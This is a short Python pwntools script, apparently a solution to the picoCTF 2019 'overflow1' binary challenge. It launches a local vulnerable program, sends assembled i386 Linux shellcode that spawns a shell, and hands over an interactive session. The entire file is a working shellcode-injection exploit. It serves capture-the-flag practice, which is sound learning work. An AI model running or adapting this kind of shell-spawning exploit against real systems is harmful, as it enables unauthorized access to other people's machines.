from pwn import *

sh = process('home/hannes/Dokumente/Privat/Pentesting/CTF/picoCTF/2019/Binary/overflow1/vuln')

sh.sendlineafter('!\n', asm(shellcraft.i386.linux.sh()))
sh.interactive()
